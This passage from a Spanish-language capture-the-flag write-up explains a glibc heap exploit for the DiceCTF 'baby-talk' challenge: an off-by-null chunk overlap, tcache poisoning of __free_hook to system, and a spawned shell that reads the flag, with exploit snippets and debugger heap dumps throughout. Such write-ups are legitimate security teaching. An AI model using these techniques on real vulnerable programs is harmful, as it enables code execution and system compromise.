[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-blue">Heap</span> | <span class="code-dark-magenta">Stack</span> | <span class="code-dark-green">Writable</span> | <span class="code-blue">ReadOnly</span> | <span class="code-grey">None</span> | <span class="mtku">RWX</span> ]
<span class="code-blue">Start              End                Size               Offset             Perm Path</span>
<span class="code-dark-red">0x00007fd2ff400000</span> <span class="code-dark-red">0x00007fd2ff5e7000</span> <span class="code-dark-red">0x00000000001e7000</span> <span class="code-dark-red">0x0000000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./libc.so.6<span class="code-blue">  &lt;-  $rcx, $rip, $r10</span>  
<span class="code-grey">0x00007fd2ff5e7000</span> <span class="code-grey">0x00007fd2ff7e7000</span> <span class="code-grey">0x0000000000200000</span> <span class="code-grey">0x00000000001e7000</span> <span class="code-grey">---</span> <span class="code-grey">./libc.so.6</span>
<span class="code-blue">0x00007fd2ff7e7000</span> <span class="code-blue">0x00007fd2ff7eb000</span> <span class="code-blue">0x0000000000004000</span> <span class="code-blue">0x00000000001e7000</span> <span class="code-blue">r--</span> <span class="code-blue">./libc.so.6</span>
<span class="code-dark-green">0x00007fd2ff7eb000</span> <span class="code-dark-green">0x00007fd2ff7ed000</span> <span class="code-dark-green">0x0000000000002000</span> <span class="code-dark-green">0x00000000001eb000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">./libc.so.6</span>
</code></pre></div><h3 id="_null-byte-poison_"><em>Null-byte poison</em></h3><p>Ahora es momento de realizar el ataque de <em>Null-byte poison</em>. Para esto, usaremos dos <em>chunks</em> (<code>a</code> y <code>b</code>, con índices <code>9</code> y <code>10</code>). Usaré <code>a</code> para desbordar con el byte nulo en el tamaño de <code>b</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'a'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'b'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'x'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">6</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk6">5</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">)</span>
</code></pre></div><p>Obsérvese que llené el Tcache porque necesitamos usar <em>chunks</em> de <em>Unsorted Bin</em> para activar la consolidación de <em>chunks</em>. Tenemos este estado del <em>heap</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>visual-heap
<span class="code-dark-yellow">0x556137576b50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576b60: 0x6161616161616161 0x6161616161616161 | aaaaaaaaaaaaaaaa |</span>
<span class="code-dark-yellow">* 14 lines, 0xe0 bytes</span>
<span class="code-dark-red">0x556137576c50: 0x6161616161616161 0x0000000000000101 | aaaaaaaa........ |</span>
<span class="code-dark-red">0x556137576c60: 0x0000000000000062 0x0000000000000000 | b............... |</span>
<span class="code-dark-red">0x556137576c70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576d50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-green">0x556137576d60: 0x0000000000000078 0x0000000000000000 | x............... |</span>
<span class="code-dark-green">0x556137576d70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576e50: 0x0000000000000000 0x00000000000201b1 | ................ |  &lt;-  top</span>
<span class="code-dark-blue">0x556137576e60: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 8217 lines, 0x20190 bytes</span>
<span class="code-green">gef&gt; </span>bins tcache
<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
tcachebins[idx=14, size=0x100, @<span class="code-dark-blue">0x5561375760c0</span>] count=6
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576450</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576560</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576550</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576660</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576650</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576760</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576750</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576860</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576850</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576960</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576950</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=<span class="code-dark-blue">0x556137576010</span>)
<span class="code-blue">[+]</span> Found 6 chunks in tcache.
</code></pre></div><p>Todavía queda un espacio en el Tcache, usaré este espacio para liberar <code>a</code> después de causar el <em>off-by-null</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_tok</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\x01</span><span class="mtk4">'</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">)</span>
</code></pre></div><p>A continuación, asignamos nuevamente e insertamos un <em>chunk</em> falso dentro del <em>chunk</em> <code>a</code> y lo eliminamos otra vez para mantener el Tcache lleno:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span>
<span class="mtk1">        </span><span class="mtk8">do_str</span><span class="mtk1">(</span>
<span class="mtk1">            </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">,</span>
<span class="mtk1">            p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span>
<span class="mtk1">            p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">e0</span><span class="mtk1">) </span><span class="mtk5">+</span>
<span class="mtk1">            p64(</span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">b80</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span>  
<span class="mtk1">            p64(</span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">b70</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span>
<span class="mtk1">            </span><span class="mtk7 mtki">b</span><span class="mtk4">'c'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">b0</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">e0</span><span class="mtk1">)</span>
<span class="mtk1">        )</span>
<span class="mtk1">    )</span>
</code></pre></div><p>Este es ahora el estado del <em>heap</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>visual-heap
<span class="code-dark-yellow">0x556137576b50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576b60: 0x0000556137576460 0x0000556137576010 | `dW7aU...`W7aU.. |  &lt;-  tcache[idx=14,sz=0x100][1/7]</span>  
<span class="code-dark-yellow">0x556137576b70: 0x0000000000000000 0x00000000000000e0 | ................ |</span>
<span class="code-dark-yellow">0x556137576b80: 0x0000556137576b80 0x0000556137576b80 | .kW7aU...kW7aU.. |</span>
<span class="code-dark-yellow">0x556137576b90: 0x0000556137576b70 0x0000556137576b70 | pkW7aU..pkW7aU.. |</span>
<span class="code-dark-yellow">0x556137576ba0: 0x6363636363636363 0x6363636363636363 | cccccccccccccccc |</span>
<span class="code-dark-yellow">* 10 lines, 0xa0 bytes</span>
<span class="code-dark-red">0x556137576c50: 0x00000000000000e0 0x0000000000000100 | ................ |</span>
<span class="code-dark-red">0x556137576c60: 0x0000000000000062 0x0000000000000000 | b............... |</span>
<span class="code-dark-red">0x556137576c70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576d50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-green">0x556137576d60: 0x0000000000000078 0x0000000000000000 | x............... |</span>
<span class="code-dark-green">0x556137576d70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576e50: 0x0000000000000000 0x00000000000201b1 | ................ |  &lt;-  top</span>
<span class="code-dark-blue">0x556137576e60: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 8217 lines, 0x20190 bytes</span>
</code></pre></div><p>Obsérvese lo siguiente:</p><ul><li>El <em>chunk</em> <code>b</code> tiene <code>PREV_INUSE</code> a <code>0</code></li><li>El <em>chunk</em> <code>b</code> tiene <code>prev_size</code> igual a <code>0xe0</code></li><li>Hay un <em>chunk</em> de tamaño falso <code>0xe0</code> exactamente <code>0xe0</code> bytes arriba</li><li>Los punteros <code>fd</code> y <code>bk</code> del <em>chunk</em> falso satisface los controles de seguridad porque:</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">P->fd->bk = *((*((0x556137576b70).fd)).bk)
          = *(*(0x556137576b70 + 0x10) + 0x18)  
          = *(*(0x556137576b80) + 0x18)
          = *(0x556137576b80 + 0x18)
          = *(0x556137576b98)
          = 0x556137576b70
          = P

P->bk->fd = *((*((0x556137576b70).bk)).fd)
          = *(*(0x556137576b70 + 0x18) + 0x10)
          = *(*(0x556137576b88) + 0x10)
          = *(0x556137576b80 + 0x10)
          = *(0x556137576b90)
          = 0x556137576b70
          = P
</code></pre></div><p>Como resultado, podemos eliminar el <em>chunk</em> <code>b</code> (índice <code>10</code>) y el asignador del <em>heap</em> fusionará el <em>chunk</em> <code>b</code> con el <em>chunk</em> falso:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk6">10</span><span class="mtk1">)</span>  
</code></pre></div><p>Obtenemos esto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>visual-heap
<span class="code-dark-yellow">0x556137576b50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576b60: 0x0000556137576460 0x0000556137576010 | `dW7aU...`W7aU.. |  &lt;-  tcache[idx=14,sz=0x100][1/7]</span>  
<span class="code-dark-yellow">0x556137576b70: 0x0000000000000000 0x00000000000001e1 | ................ |  &lt;-  unsortedbins[1/1]</span>
<span class="code-dark-yellow">0x556137576b80: 0x00007fd2ff7ebca0 0x00007fd2ff7ebca0 | ..~.......~..... |</span>
<span class="code-dark-yellow">0x556137576b90: 0x0000556137576b80 0x0000556137576b80 | .kW7aU...kW7aU.. |</span>
<span class="code-dark-yellow">0x556137576ba0: 0x6363636363636363 0x6363636363636363 | cccccccccccccccc |</span>
<span class="code-dark-yellow">* 10 lines, 0xa0 bytes</span>
<span class="code-dark-red">0x556137576c50: 0x00000000000000e0 0x0000000000000100 | ................ |</span>
<span class="code-dark-red">0x556137576c60: 0x0000000000000062 0x0000000000000000 | b............... |</span>
<span class="code-dark-red">0x556137576c70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576d50: 0x00000000000001e0 0x0000000000000100 | ................ |</span>
<span class="code-dark-green">0x556137576d60: 0x0000000000000078 0x0000000000000000 | x............... |</span>
<span class="code-dark-green">0x556137576d70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576e50: 0x0000000000000000 0x00000000000201b1 | ................ |  &lt;-  top</span>
<span class="code-dark-blue">0x556137576e60: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 8217 lines, 0x20190 bytes</span>
</code></pre></div><p>Obsérvese que tenemos <em>chunks</em> solapados, ya que el <em>chunk</em> <code>a</code> está en el Tcache y en el interior tenemos nuestro <em>chunk</em> falso en <em>Unsorted Bin</em>.</p><h3 id="tcache-_poisoning_">Tcache <em>poisoning</em></h3><p>Ahora podemos asignar y liberar algunos <em>chunks</em> pequeños y después de eso hacer un ataque de Tcache <em>poisoning</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'Q'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'x'</span><span class="mtk1">))</span>  
<span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>visual-heap
<span class="code-dark-yellow">0x556137576b50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576b60: 0x0000556137576460 0x0000556137576010 | `dW7aU...`W7aU.. |  &lt;-  tcache[idx=14,sz=0x100][1/7]</span>  
<span class="code-dark-yellow">0x556137576b70: 0x0000000000000000 0x0000000000000021 | ........!....... |</span>
<span class="code-dark-yellow">0x556137576b80: 0x0000556137576ba0 0x0000556137576010 | .kW7aU...`W7aU.. |  &lt;-  tcache[idx=0,sz=0x20][1/2]</span>
<span class="code-dark-yellow">0x556137576b90: 0x0000556137576b80 0x0000000000000021 | .kW7aU..!....... |</span>
<span class="code-dark-yellow">0x556137576ba0: 0x0000000000000000 0x0000556137576010 | .........`W7aU.. |  &lt;-  tcache[idx=0,sz=0x20][2/2]</span>
<span class="code-dark-yellow">0x556137576bb0: 0x6363636363636363 0x00000000000001a1 | cccccccc........ |  &lt;-  unsortedbins[1/1]</span>
<span class="code-dark-yellow">0x556137576bc0: 0x00007fd2ff7ebca0 0x00007fd2ff7ebca0 | ..~.......~..... |</span>
<span class="code-dark-yellow">0x556137576bd0: 0x6363636363636363 0x6363636363636363 | cccccccccccccccc |</span>
<span class="code-dark-yellow">* 7 lines, 0x70 bytes</span>
<span class="code-dark-red">0x556137576c50: 0x00000000000000e0 0x0000000000000100 | ................ |</span>
<span class="code-dark-red">0x556137576c60: 0x0000000000000062 0x0000000000000000 | b............... |</span>
<span class="code-dark-red">0x556137576c70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576d50: 0x00000000000001a0 0x0000000000000100 | ................ |</span>
<span class="code-dark-green">0x556137576d60: 0x0000000000000078 0x0000000000000000 | x............... |</span>
<span class="code-dark-green">0x556137576d70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576e50: 0x0000000000000000 0x00000000000201b1 | ................ |  &lt;-  top</span>
<span class="code-dark-blue">0x556137576e60: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 8217 lines, 0x20190 bytes</span>
</code></pre></div><p>A continuación asignamos un <em>chunk</em> de tamaño <code>0x100</code> que se colocará donde el <em>chunk</em> <code>a</code>, porque fue el último en ser liberado, y modificar el puntero <code>fd</code> del primer <em>chunk</em> de <code>0x20</code> para que apunte a <code>__free_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'X'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">21</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.__free_hook))</span>  
</code></pre></div><p>Nótese que la lista de Tcache <code>0x20</code> está corrupta y el puntero <code>fd</code> apunta a <code>__free_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>bins tcache
<span class="code-dark-cyan">---------------------- Tcachebins for arena 'main_arena' ----------------------</span>
tcachebins[idx=0, size=0x20, @<span class="code-dark-blue">0x556137576050</span>] count=2
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576b70</span>, size=<span class="code-magenta">0x20</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7fd2ff7ed8e8</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x7fd2ff7ed8d8</span>, size=<span class="code-magenta">0x0</span>, flags=, fd=0x000000000000, bk=0x000000000000)
tcachebins[idx=14, size=0x100, @<span class="code-dark-blue">0x5561375760c0</span>] count=6
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576450</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576560</span>, bk=<span class="code-dark-blue">0x556137576010</span>)  
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576550</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576660</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576650</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576760</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576750</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576860</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576850</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576960</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576950</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=<span class="code-dark-blue">0x556137576010</span>)
<span class="code-blue">[+]</span> Found 8 chunks in tcache.
</code></pre></div><p>Ahora, podemos asignar dos <em>chunks</em> de tamaño <code>0x20</code>, y el segundo se colocará en <code>__free_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">s</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system))</span>  
</code></pre></div><p>Veamos si tenemos la dirección de <code>system</code> en <code>__free_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/gx &__free_hook
<span class="code-dark-blue">0x7fd2ff7ed8e8</span> &lt;<span class="code-dark-yellow">__free_hook</span>&gt;:   0x00007fd2ff44f420  
<span class="code-green">gef&gt; </span>x/gx (void*) __free_hook
<span class="code-dark-blue">0x7fd2ff44f420</span> &lt;<span class="code-dark-yellow">system</span>&gt;:        0xfa66e90b74ff8548
</code></pre></div><p>Muy bien, así que en este punto, estaremos llamando a <code>system</code> cada vez que ejecutemos <code>free</code>. Por lo tanto, si eliminamos el <em>chunk</em> anterior, que contiene <code>"/bin/sh"</code>, estaremos ejecutando <code>system("/bin/sh")</code> y tendremos una <em>shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk1">s</span><span class="mtk1">)</span>  
</code></pre></div><p>Aquí la tenemos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span>
</span>[<span class="code-blue">*</span>] './chall'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 3295687
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '3295687', '-x', '/tmp/pwn3wxiodgv.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Heap base address: 0x556137576000
[<span class="code-green">+</span>] Glibc base address: 0x7fd2ff400000
</span>[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
chall  Dockerfile  flag.txt  ld-linux-x86-64.so.2  libc.so.6  solve.py
</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Ejecutemos el <em>exploit</em> de forma remota:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> mc.ax 32526
[<span class="code-blue">*</span>] './chall'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Opening connection to mc.ax on port 32526: Done  
[<span class="code-blue">*</span>] Heap base address: 0x5cb86eb40000
[<span class="code-green">+</span>] Glibc base address: 0x7d812429c000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt
run
<span class="code-red">$</span> cat flag.txt
dice{tkjctf_lmeow_fee9c2ee3952d7b9479306ddd8e477ca}
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/CTF-scripts/blob/main/DiceCTF/baby-talk/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-_token_">Función de <em>token</em></a></li></ul></li><li><a href="#configuración-del-entorno">Configuración del entorno</a><ul><li><a href="#versiones-diferentes">Versiones diferentes</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#_null-byte-poison_"><em>Null-byte poison</em></a></li><li><a href="#tcache-_poisoning_">Tcache <em>poisoning</em></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
